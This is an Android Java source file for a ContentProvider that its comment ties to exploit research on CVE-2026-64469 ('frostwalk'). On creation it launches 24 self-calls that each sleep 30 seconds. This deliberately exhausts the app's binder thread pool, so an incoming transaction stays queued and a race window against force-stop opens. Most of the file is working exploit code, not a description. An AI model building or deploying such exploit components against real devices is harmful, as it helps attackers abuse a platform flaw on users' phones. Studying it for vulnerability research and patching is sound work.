package dev.pixelksu.domainprobe;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

/** Research support for CVE-2026-64469 (frostwalk): a transaction sent to a
 *  live app's provider is normally serviced almost immediately, since
 *  publishing the provider (what getContentProviderExternal() waits for)
 *  already means the app's binder thread pool is up -- there is no window
 *  for an external sender to force-stop the process while its own
 *  transaction still sits undelivered. This provider closes that window
 *  itself, on its own onCreate(): SATURATE_THREADS self-calls, each blocked
 *  in Thread.sleep(), occupy every thread the platform will hand this
 *  process's binder driver, so a transaction arriving afterwards queues in
 *  the process's own todo rather than being answered. Not a general-purpose
 *  provider -- every real method is a stub.
 */
public final class StallProvider extends ContentProvider {
	private static final int SATURATE_THREADS = 24;   // above the platform's binder thread-pool max
	private static final long BLOCK_MS = 30_000;

	@Override
	public boolean onCreate() {
		Context ctx = getContext();
		Uri uri = Uri.parse("content://" + ctx.getPackageName() + ".stall");
		for (int i = 0; i < SATURATE_THREADS; i++) {
			final int n = i;
			new Thread(() -> {
				try {
					ctx.getContentResolver().call(uri, "block", null, null);
				} catch (Throwable ignored) {
				}
			}, "stall-saturate-" + n).start();
		}
		return true;
	}

	@Override
	public Bundle call(String method, String arg, Bundle extras) {
		try {
			Thread.sleep(BLOCK_MS);
		} catch (InterruptedException ignored) {
		}
		return null;
	}

	@Override
	public Cursor query(Uri uri, String[] projection, String selection,
			     String[] selectionArgs, String sortOrder) {
		return null;
	}

	@Override
	public String getType(Uri uri) {
		return null;
	}

	@Override
	public Uri insert(Uri uri, ContentValues values) {
		return null;
	}

	@Override
	public int delete(Uri uri, String selection, String[] selectionArgs) {
		return 0;
	}

	@Override
	public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
		return 0;
	}
}
